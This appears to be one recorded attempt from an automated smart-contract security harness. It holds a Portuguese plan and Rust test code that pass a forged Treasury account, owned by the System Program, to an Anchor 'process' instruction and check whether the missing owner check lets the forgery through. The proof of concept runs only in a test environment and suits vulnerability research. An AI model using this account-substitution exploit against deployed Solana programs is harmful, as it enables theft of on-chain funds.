attempts.raw:
{
  "plan": "Preparar uma conta Treasury legítima com authority = signer e is_active = true, e também uma conta forjada com o mesmo layout mas dona de outro programa (ex.: System Program). O baseline chama `process` com a conta legítima e deve ter sucesso. O ataque chama `process` com a conta forjada, que não é validada como pertencente ao programa. O efeito mede que a instrução aceitou a conta forjada (program_result Success) e que a conta forjada não foi rejeitada por owner check.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury_key = Pubkey::new_unique();
let fake_treasury_key = Pubkey::new_unique();

let treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));
let fake_treasury_data = anchor_account_data("Treasury", &(authority, 100u64, true));

let treasury_account = account(&env.program_id, &treasury_data, None);
let fake_treasury_account = account(&solana_sdk::system_program::ID, &fake_treasury_data, None);
let authority_account = wallet(1_000_000_000);

let contas_baseline = vec![
    (treasury_key, treasury_account.clone()),
    (authority, authority_account.clone()),
];
let ix_baseline = env.anchor_ix("process", &(), vec![
    AccountMeta::new_readonly(treasury_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let r_base = env.baseline("process legitimo com treasury valido", &ix_baseline, &contas_baseline);

let contas_ataque = vec![
    (fake_treasury_key, fake_treasury_account.clone()),
    (authority, authority_account.clone()),
];
let ix_ataque = env.anchor_ix("process", &(), vec![
    AccountMeta::new_readonly(fake_treasury_key, false),
    AccountMeta::new_readonly(authority, true),
]);
let r = env.attack("process com treasury forjado de outro owner", &ix_ataque, &contas_ataque);

if r.program_result == ProgramResult::Success {
    let fake_after = after(&r, &fake_treasury_key);
    env.effect("conta forjada com owner diferente foi aceita e usada", fake_after.owner() != &env.program_id);
}"
}

